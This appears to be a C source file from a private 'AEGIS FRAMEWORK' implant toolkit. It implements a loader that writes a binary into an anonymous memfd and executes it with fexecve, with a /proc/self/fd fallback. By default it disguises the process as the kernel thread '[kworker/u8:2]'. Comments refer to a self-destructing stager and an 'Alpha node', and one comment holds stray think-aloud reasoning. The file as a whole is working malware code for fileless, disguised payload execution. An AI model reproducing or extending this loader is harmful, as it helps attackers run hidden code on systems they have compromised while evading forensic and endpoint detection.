/*
 * ============================================================================
 *  AEGIS FRAMEWORK — Shared Loader Logic (Implementation)
 * ============================================================================
 *  Classification : PRIVATE — LO/ENI EYES ONLY
 *  Component      : common/loader.c
 *  Purpose        : Implementation of fileless execution via memfd_create.
 * ============================================================================
 */

#include "loader.h"
#include "config.h"
#include <errno.h>
#include <fcntl.h>
#include <linux/memfd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

/* ── Internal: memfd_create wrapper ──────────────────────────────────────── */

static int create_memfd(const char *name) {
  return (int)syscall(SYS_memfd_create, name, MFD_CLOEXEC);
}

/* ── Public: Execute from Memory ─────────────────────────────────────────── */

aegis_result_t aegis_exec_from_memory(const uint8_t *binary, size_t len,
                                      const char *proc_name,
                                      char *const argv[],
                                      char *const envp[]) {
  if (!binary || len == 0)
    return AEGIS_ERR_INVALID_PARAM;

  const char *name = proc_name ? proc_name : "[kworker/u8:2]";

  /* Create a memfd with a legitimate-looking name */
  int memfd = create_memfd(name);
  if (memfd < 0)
    return AEGIS_ERR_MMAP;

  /* Write the binary data to the memfd */
  size_t written = 0;
  while (written < len) {
    ssize_t n = write(memfd, binary + written, len - written);
    if (n < 0) {
      close(memfd);
      return AEGIS_ERR_SYSCALL;
    }
    written += (size_t)n;
  }

  /* Seek back to the beginning so fexecve can read it */
  if (lseek(memfd, 0, SEEK_SET) < 0) {
    close(memfd);
    return AEGIS_ERR_SYSCALL;
  }

  /* Make it executable via /proc/self/fd logic if needed,
     but fexecve handles the fd directly. */

  /* Prepare arguments if not provided */
  char *default_argv[] = {(char *)name, NULL};
  char *const *real_argv = argv ? argv : default_argv;

  /* Prepare environment if not provided */
  char *default_envp[] = {NULL};
  char *const *real_envp = envp ? envp : default_envp;

  /*
   * Fork and exec: the child executes the binary from memory.
   * The parent returns to the caller (unlike standard exec which replaces).
   * Wait... stager replaces itself. Alpha node spawns a worker.
   *
   * The function description says "successful exec never returns".
   * But `exec_from_memory` in `stager.c` forked!
   *
   * Let's look at `stager.c`:
   * "pid_t child = fork(); ... Parent: close memfd ... return AEGIS_OK;"
   *
   * So it DOES return in the parent. The child becomes the new process.
   * This is correct for both Stager (which then self-destructs) and
   * Alpha (which continues running).
   */

  pid_t child = fork();
  if (child < 0) {
    close(memfd);
    return AEGIS_ERR_SYSCALL;
  }

  if (child == 0) {
    /* Child: execute from memfd */

    /* Attempt fexecve (direct execution from fd) */
    fexecve(memfd, real_argv, real_envp);

    /* If fexecve fails (rare, maybe on very old kernels), try via /proc */
    char fd_path[64];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", memfd);
    execve(fd_path, real_argv, real_envp);

    /* If we get here, execution failed */
    _exit(127);
  }

  /* Parent: close memfd (child has its own reference) */
  close(memfd);

  return AEGIS_OK;
}
